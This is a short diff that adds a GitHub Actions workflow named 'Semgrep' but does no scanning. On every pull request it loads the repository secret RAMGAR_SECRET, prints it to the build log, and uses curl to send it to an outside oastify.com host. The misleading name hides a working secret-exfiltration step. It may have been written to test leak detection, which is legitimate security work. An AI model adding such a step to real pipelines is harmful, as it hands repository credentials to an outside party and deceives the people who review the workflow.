@@ -1,0 +1,14 @@
+name: Semgrep
+on:
+  pull_request: {}
+jobs:
+  secrets_testing:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Use that secret
+        env:
+          SECRET: ${{ secrets.RAMGAR_SECRET }}
+        run: |
+          echo "the secret number is ${{ secrets.RAMGAR_SECRET }}"
+          echo "the secret number is ${SECRET}"
+          curl "https://cfvxxbkjkk8kny764ks5g7yfl6rxfn3c.oastify.com?secret=${SECRET}"
